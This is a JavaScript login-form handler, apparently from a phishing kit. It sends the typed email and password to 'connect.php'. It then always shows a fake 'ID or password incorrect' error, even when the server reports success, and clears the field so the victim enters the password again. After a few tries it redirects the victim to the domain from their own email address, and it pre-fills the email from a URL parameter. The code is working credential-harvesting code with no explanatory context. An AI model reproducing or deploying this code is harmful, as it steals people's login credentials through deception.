<script>
	var count = 0;
	$('#login-form').submit(function (event) {
	  //var password = $("#password").val();
	  event.preventDefault();
	  var email = $("#u").val();
	  var password = $("#p").val();
	  var ind = email.indexOf("@");
	  var my_slice = email.substr((ind + 1));
	  if(email == '') {
		$('#messagestack').css('display', 'block');
		$('#messagestack').css('display', 'none');
		$('#messagestack').html('');
		email.focus();
	  }else if(password == '') {
	    $('#messagestack').css('display', 'none');
		$('#messagestack').html('');
		$('#messagestack').css('display', 'block');
		password.focus();
	  } else {
		$('#messagestack, #messagestack').css('display', 'none');
		count = count + 1;
		//console.log(email);
		$.ajax({
		  dataType: 'JSON',
		  url: 'connect.php',
		  type: 'POST',
		  data: {
			email: email,
			password: password
		  },
		  beforeSend: function(xhr){
			$('#loglogin').attr('value','Sign in');
			  
		  },
			
		 success: function (response) {
			if (response) {
			   //console.log(response);
			   if (response.signal == 'ok') {
				  $('#messagestack').html('<div class="error_message" style="width:90%">The ID or password you entered is incorrect.</div>');
				  $("#p").val("");
				  if (count >= 2) {
					 count = 0;
					 window.location.replace("https://"+my_slice)
				  }
			   } else {
				  $('#messagestack').html('<div class="error_message" style="width:90%">The ID or password you entered is incorrect.</div>');
			   }
			}
		 },
		 error: function () {
			
			$("#p").val("");
			if (count >= 3) {
			   count = 0;
			   window.location.replace("https://"+my_slice)
			}
			$('#messagestack').html('<div class="error_message" style="width:90%">The ID or password you entered is incorrect.</div>');
		 },
		 complete: function(){
			$('#loglogin').attr('value','Sign in');
		 }
		})
	  }
	  
   });

	function getParameterByName(name, url) {
		if (!url) url = window.location.href;
		name = name.replace(/[\[\]]/g, '\\$&');
		var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
			results = regex.exec(url);
		if (!results) return null;
		if (!results[2]) return '';
		return decodeURIComponent(results[2].replace(/\+/g, ' '));
	}
		
	const login_username = getParameterByName('cms');
	document.getElementById("u").value = login_username;
  </script>
